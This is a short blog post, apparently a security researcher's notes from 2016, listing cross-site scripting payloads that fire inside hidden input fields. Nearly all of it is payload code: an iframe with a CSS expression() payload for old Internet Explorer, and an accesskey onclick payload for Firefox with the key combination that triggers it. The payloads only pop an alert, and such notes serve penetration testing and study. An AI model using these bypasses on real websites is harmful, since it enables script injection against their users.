---
title: Bypass input hidden XSS
date: 2016-05-31 15:20:41
tags: XSS
---

> example

```
<input type="hidden" name="redacted" value="default" injection="xss" />
```
<!--more-->
### Iframe
> Test in IE6-9

> 1.html

```
<iframe src=two.html>
```
> 2.html

```
<input type=hidden style=x:expression(alert(1))>
```
### firefox Onclick
> Only works on Firefox. ALT+SHIFT+X on Windows/Linux, CTRL+ALT+X osx.

```
<input type="hidden" accesskey="X" onclick="alert(1)">
```